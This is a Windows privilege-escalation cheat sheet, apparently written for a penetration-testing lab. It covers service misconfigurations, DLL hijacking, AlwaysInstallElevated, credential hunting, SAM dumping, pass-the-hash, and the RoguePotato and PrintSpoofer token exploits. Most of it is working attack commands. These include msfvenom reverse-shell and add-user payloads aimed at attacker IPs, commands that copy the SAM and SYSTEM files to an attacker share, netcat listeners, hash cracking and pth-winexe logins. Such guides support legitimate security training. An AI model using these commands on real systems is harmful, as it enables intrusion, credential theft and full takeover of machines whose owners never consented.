# Windows Privilege Escalation

## Table of Contents

* [Tools](#tools)
  * [Windows-Exploit-Suggester](#windows-exploit-suggester)
  * [WinPEAS](#winpeas)
* [Kernel Exploits](#kernel-exploits)
* [Service Exploits](#service-exploits)
  * [Insecure Service Permissions](#insecure-service-permissions)
  * [Unquoted Service Path](#unquoted-service-path)
  * [Weak Registry Permissions](#weak-registry-permissions)
  * [Insecure Service Executables](#insecure-service-executables)
  * [DLL Hijacking](#dll-hijacking)
* [Registry Exploits](#registry-exploits)
  * [Autoruns](#autoruns)
  * [AlwaysInstallElevated](#alwaysinstallelevated)
* [Passwords](#passwords)
  * [Registry](#registry)
  * [Saved Credentials](#saved-credentials)
  * [Unintended Installs](#unintended-installs)
  * [Searching For Configuration Files](#searching-for-configuration-files)
  * [Security Account Manager (SAM)](#security-account-manager-sam)
  * [Pass the Hash](#pass-the-hash)
* [Scheduled Tasks](#scheduled-tasks)
* [Applications](#applications)
  * [Insecure GUI Applications](#insecure-gui-applications)
  * [Startup Applications](#startup-applications)
  * [Installed Applications](#installed-applications)
* [Token Impersonation](#token-impersonation)
  * [Rogue Potato](#rogue-potato)
  * [PrintSpoofer](#printspoofer)

## Tools

### Windows-Exploit-Suggester
> https://github.com/bitsadmin/wesng (new version)

> https://github.com/AonCyberLabs/Windows-Exploit-Suggester

#### New version
Retrieve system information from target Windows host and save output into a text file.
```powershell
systeminfo
```

Run the following command with the system information text file.
```powershell
python wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
```

Cross reference any results from the output with any known binaries from SecWiki's github kernel precompiled exploits. If none are found, go through the results and use Google to look for exploits.

#### Old version
Make sure python3-xlrd dependency is installed.
```powershell
apt-get update
apt-get install python3-xlrd
```

Update the database to create the excel spreadsheet from the Microsoft vulnerability database.
```powershell
python windows-exploit-suggester.py --update
```

Retrieve system information from target Windows host and save output into a text file.
```powershell
systeminfo
```

Run the following command with the updated database and system information text file. Output can be filtered to show only local or remote vulnerabilities.
```powershell
python windows-exploit-suggester.py --database 2021-09-22-mssb.xls --systeminfo sysinfo.txt
python windows-exploit-suggester.py --database 2021-09-22-mssb.xls --systeminfo sysinfo.txt --local
python windows-exploit-suggester.py --database 2021-09-22-mssb.xls --systeminfo sysinfo.txt --remote
```

If unable to read hotfixes installed from "systeminfo", use the WMI command-line (WMIC) utility and save the output into a text file.
```powershell
wmic qfe list full
python windows-exploit-suggester.py --database 2021-09-22-mssb.xls --systeminfo sysinfo.txt --hotfixes hotfixes.txt
```

### WinPEAS
> https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

* winPEAS.exe = .NET Framework 4.0
* winPEAS.bat = no .NET Framework 4.0
* winPEASany.exe = any

Check which versions of .NET Framework are installed.
```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full" /v version
dir /b /ad /o-n %systemroot%\Microsoft.NET\Framework\v?.*
```

Transfer winPEAS to target host and run the script.
```powershell
winPEAS.exe
winPEAS.bat
winPEASany.exe
```

## Kernel Exploits
> https://github.com/SecWiki/windows-kernel-exploits (precompiled exploits)

Use Windows Exploit Suggester to look for kernel exploits.

Use SecWiki to look for precompiled kernel exploits.

## Service Exploits
Service commands.
```powershell
#query the configuration of a service
sc.exe qc [service]

#query the current status of a service
sc.exe query [service]

#modify a configuration option of a service
sc.exe config [service] [option]= [value]

#start/stop a service
net start/stop [service]
```

### Insecure Service Permissions
A user that has permission to change the configuration of a service that runs with SYSTEM privileges can change the executable the service uses.

Check services information using `winPEAS` and look for modifiable services.
```powershell
winPEASany.exe quiet servicesinfo

daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"]
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
```

Check the account permissions on the service.
```powershell
accesschk.exe /accepteula -uwcqv user daclsvc

RW daclsvc
        SERVICE_CHANGE_CONFIG
        SERVICE_START
        SERVICE_STOP
```

Query the service configuration and make sure it runs with SYSTEM privileges.
```powershell
sc qc daclsvc

SERVICE_START_NAME : LocalSystem
```

Modify the service configuration and set the `BINARY_PATH_NAME (binpath)` to a reverse shell payload.
```powershell
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

Start a listener on the attacker machine and then start the service to spawn a SYSTEM shell.
```powershell
net start daclsvc
```

### Unquoted Service Path
File paths that contain spaces should be enclosed in double quotes.

For each space in the file path, Windows will attempt to look for and execute programs with a name that matches the word before a space.
```powershell
C:\Program Files\Program\Some Folder\Service.exe

C:\Program.exe
C:\Program Files\Program\Some.exe
C:\Program Files\Program\Some Folder\Service.exe
```

Search the system for services with an unquoted service path using the following command or `winPEAS`.
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
winPEASany.exe quiet servicesinfo
```

Check if the user can start/stop the service.
```powershell
accesschk.exe /accepteula -ucqv user unquotedsvc

R unquotedsvc
        SERVICE_START
        SERVICE_STOP
```

Query the service configuration and make sure it runs with SYSTEM privileges.
```powershell
sc qc unquotedsvc

BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
SERVICE_START_NAME : LocalSystem
```

Check for write permissions on each directory in the existing binary path.
```powershell

accesschk.exe /accepteula -uwdq "C:"
accesschk.exe /accepteula -uwdq "C:\Program Files\"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

 RW BUILTIN\Users
```

Create `Common.exe` in the `"C:\Program Files\Unquoted Path Service\"` directory, which will get executed by the service when it starts.
```powershell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

Start a listener on the attacker machine and then start the service to spawn a SYSTEM shell.
```powershell
net start unquotedsvc
```

### Weak Registry Permissions
The Windows Registry stores entries for each service, and if Registry entries have a misconfigured ACL, it may be possible to modify a service's configuration.

Check if it's possible to modify any service Registry using `winPEAS`.
```powershell
winPEASany.exe quiet servicesinfo

HKLM\system\currentcontrolset\services\regsvc
```

Check if the user can start/stop the service.
```powershell
accesschk.exe /accepteula -ucqv user regsvc
```

Check the current values in the service Registry entry.
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    ObjectName    REG_SZ    LocalSystem
```

Check that the Registry entry for the service is writable. (use accesschk or powershell)
```powershell
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
PS > Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

Overwrite the ImagePath Registry key to point to a reverse shell payload.
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Start a listener on the attacker machine and then start the service to spawn a SYSTEM shell.
```powershell
net start regsvc
```

### Insecure Service Executables
If an original service executable is modifiable by the user, it can simply be replaced with a file that has the same name. Always create a backup of the original executable and restore it when finished in a real system.

Check if any service has an executable that is writable using `winPEAS` or `accesschk`.
```powershell
winPEASany.exe quiet servicesinfo

filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"]
    File Permissions: Everyone [AllAccess]
    
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Check if the user can start/stop the service.
```powershell
accesschk.exe /accepteula -ucqv user filepermsvc
```

Create a backup.
```powershell
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```

Overwrite `"C:\Program Files\File Permissions Service\filepermservice.exe"` with a reverse shell payload.
```powershell
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

Start a listener on the attacker machine and then start the service to spawn a SYSTEM shell.
```powershell
net start filepermsvc
```

### DLL Hijacking
Often a service will try to load functionality from a libary called Dynamic Link Library. If a directory of a DLL is writable and is missing from the system, escalation of privileges may be possible.

Check for missing DLLs using `winPEAS` or with `Procmon` by setting two filters.
```powershell
winPEASany.exe quiet servicesinfo

"Result" "contains" "not found"
"Path" "ends with" ".dll"
```

Check if the user can start/stop the service.
```powershell
accesschk.exe /accepteula -ucqv user dllsvc
```

Query the service configuration and make sure it runs with SYSTEM privileges.
```powershell
sc qc dllsvc

BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
SERVICE_START_NAME : LocalSystem
```

In a real scenario, `"C:\Program Files\DLL Hijack Service\dllhijackservice.exe"` will get copied onto another Windows machine with administrator rights so that `Procmon` can be used on the executable for analysis.

In Procmon, stop and clear the current capture, press `Ctrl-L` to open up the filter panel, add a new filter on the process name matching the executable `dllhijackservice.exe`, and deselect `Show Retwork Activity` and `Show Network Activity`.

Start capturing again and start the service.
```powershell
net start dllsvc
```

Look at the results and look for DLLs with "NAME NOT FOUND" that is located in a writable directory. In this case, `C:\Temp\hijackme.dll` is in a writable directory.

On the attacker machine, generate a msfvenom reverse shell payload with the same name as the dll file.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.9.71 LPORT=53 -f dll -o hijackme.dll
```

Transfer the `hijackme.dll` payload from the attacker machine to the `C:\Tem` directory of the Windows host.
```powershell
copy \\10.13.9.71\thm\hijackme.dll C:\Temp
```

Stop and then start the service to spawn a SYSTEM shell.
```powershell
net stop dllsvc
net start dllsvc
```

## Registry Exploits

### Autoruns
Programs can be configured in the Registry to run on Startup with elevated privileges. If an `AutoRun` executable is writable, escalation of privileges may be possible when an administrator logs in to the system.

Query the registry for AutoRun executables.
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

Check if the AutoRun executable is writable.
```powershell
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

Create a backup.
```powershell
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

Overwrite the AutoRun executable with a reverse shell payload.
```powershell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

Start a listener on the attacker machine and wait for an administrator to log in to spawn a SYSTEM shell.
```bash
nc -lvnp 53
```

### AlwaysInstallElevated
This is a policy that allows users to install Microsoft Windows Installer Package Files (MSI) with elevated system permissions.

Query the Registry for the following two Registery keys and make sure they are both set to `1 (0x1)`.
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

On the attacker machine, generate an msfvenom reverse shell or adduser payload.
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
msfvenom -p windows/adduser USER=admin PASS=password -f msi -o reverse.msi
```

Transfer the payload to the Windows host.
```powershell
copy \\10.13.9.71\thm\reverse.msi C:\PrivEsc\reverse.msi
```

Start a listener on the attacker machine and run the installer to spawn a SYSTEM shell.
```powershell
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

/quiet: bypass UAC
/qn: specifies not to use a GUI
/i: perform a regular installation of the referenced package
```

## Passwords

### Registry
Many programs store configuration options in the Windows Registry, and sometimes Windows itself stores passwords in the Registry.

Search the Registry for keys and values that contain the word `password`.
```powershell
winPEASany.exe quiet filesinfo userinfo

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Query the following Registry key to find AutoLogon credentials.
```powershell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon
```

If admin credentials are found, use `winexe` from the attacker machine to spawn a SYSTEM shell.
```powershell
winexe -U 'admin%password123' --system //[target ip] cmd.exe
```

### Saved Credentials
Windows allows users to save their credentials to the system, in which these saved credentials can be used with the `runas` command to bypass the password requirement.

Check for any saved credentials.
```powershell
cmdkey /list
```

Start a listener on the attacker machine and execute a reverse shell payload using `runas` with the saved credentials to spawn a SYSTEM shell.
```powershell
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### Unintended Installs
Allows Windows to be deployed with little or no active involvement from an administrator. An XML file called `Unattend` contains all configuration settings that were set during the installation process and may contain passwords.

Look in the following directories.
```powershell
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\ 
```

Search for the following files.
```powershell
Unattend.xml
unattended.xml
unattend.txt
sysprep.xml
sysprep.inf
```

### Searching for configuration files.
Some administrators will leave configuration files on the system with passwords in them.

Recursively search the current directory for files with "pass" in the name or end in .config.
```powershell
dir /s *pass* == *.config
```

Recursively search the current directory for files that contain the word "password" and also end in either .xml, .ini, or .txt.
```powershell
findstr /si password *.xml *.ini *.txt
```

### Security Account Manager (SAM)
Windows stores password hashes in the `SAM`, which are encrypted with a key found in a file named `SYSTEM`. 

The SAM and SYSTEM files are locked and located in `C:\Windows\System32\config` while the system is running, and backups may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories.

If SAM and SYSTEM file backups are found, transfer them to the attacker machine.
```powershell
copy C:\Windows\Repair\SAM \\[attacker ip]\thm\SAM
copy C:\Windows\Repair\SYSTEM \\[attacker ip]\thm\SYSTEM
```

Clone the `creddump7` repository and install `pycrypto`.
```bash
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
```

Dump the hashes from the SAM and SYSTEM files using `pwdump.py` from `creddump7`.
```bash
python3 /opt/creddump7/pwdump.py SYSTEM SAM
```

Crack the admin password hash using `john`.
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt
```

Log into admin using the cracked password with `winexe` or `RDP` on the attacker machine to spawn a SYSTEM shell.
```bash
winexe --system -U 'admin%password123' //[target ip] cmd.exe
xfreerdp /u:admin /p:password123 /cert:ignore /v:[target ip]
```

### Pass the Hash
It is possible to authenticate to a remote server or service by using a full password hash instead of a plaintext password.

Log into admin using the full admin hash (LM and NT) with `pth-winexe` on the attacker machine to spawn a SYSTEM shell.
```bash
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //[target ip] cmd.exe
```

## Scheduled Tasks
There is no easy method of enumerating custom tasks and will need to rely on finding a script or log file that indicates a scheduled task is being run.

Check all scheduled tasks the user can see.
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

## Applications

### Insecure GUI Applications
On some older versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges.

As an example, a shortcut of Microsoft paint is found, and when executed, runs with administrator privileges, which we can confirm with the following command.
```powershell
tasklist /V | findstr mspaint.exe

mspaint.exe                   4312 RDP-Tcp#0                  2     29,184 K Running         WIN-QBA94KB3IOF\admin
```

In paint, click `file` and `open`, then click in the navigation input and type the following command to spawn a SYSTEM shell.
```powershell
file://c:/windows/system32/cmd.exe
```

### Startup Applications
Windows has a startup directory for apps that start for all users when they log in, if files can be created in that startup directory, escalation of privileges may be possible when an administrator logs in.

Use `accesschk` to check for write permissions on the `StartUp` directory.
```powershell
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

Startup apps in the startup directory must be shortcuts, and a `vbscript` can be created to create a shortcut to a reverse shell payload.
```powershell
#vbscript file
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

Use `cscript` to run the script.
```powershell
cscript C:\PrivEsc\CreateShortcut.vbs
```

Start a listener on the attacker machine and wait for an administrator to log in to spawn a SYSTEM shell.
```bash
nc -lvnp 53
```

### Installed Applications
> https://www.exploit-db.com/

Check all running programs.
```powershell
tasklist /V
```

Check for non-standard processes.
```powershell
seatbelt.exe NonstandardProcesses
winPEASany.exe quiet procesinfo
```

When an interesting program/process is found, use `exploit-db` to search for a corresponding exploit.

## Token Impersonation
There are different potato exploits used to escalate privileges from a service account to SYSTEM, the following link explains each of them.
> https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html

`Service accounts` can be used to escalate privileges if either the `SeImpersonate` or `SeAssignPrimaryToken` privileges are enabled. These privileges allow the service account to impersonate the access tokens of other users, including the SYSTEM user.

### Rogue Potato
This is a complicated exploit, check the link above for information regarding rogue potato.

Check the privileges on the service account.
```powershell
whoami /priv
```

Use `socat` on the attacker machine to port forward `port 135` to `port 9999` on Windows.
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:[target ip]:9999
```

Make sure a reverse shell payload is on the target Windows machine and start a listener on the attacker machine.

While on the Service Account, run `RoguePotato.exe` to spawn a SYSTEM shell.
```powershell
C:\PrivEsc\RoguePotato.exe -r [attacker ip] -e "C:\PrivEsc\reverse.exe" -l 9999
```

### PrintSpoofer
> https://github.com/itm4n/PrintSpoofer

The `Print Spooler` service can be used to escalate privileges by executing commands as the SYSTEM user.

Check the privileges on the service account.
```powershell
whoami /priv
```

This exploit requires that the `Visual C++ Redistributable` is installed, and this can be checked through the following registry keys.
```powershell
#64-bit VC++ Redistributable
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x64

#32-bit VC++ Redistributable
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x86
```

Start a listener on the attacker machine and run `PrintSpoofer.exe` to have it execute a reverse shell payload to spawn a SYSTEM shell. 
```bash
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```
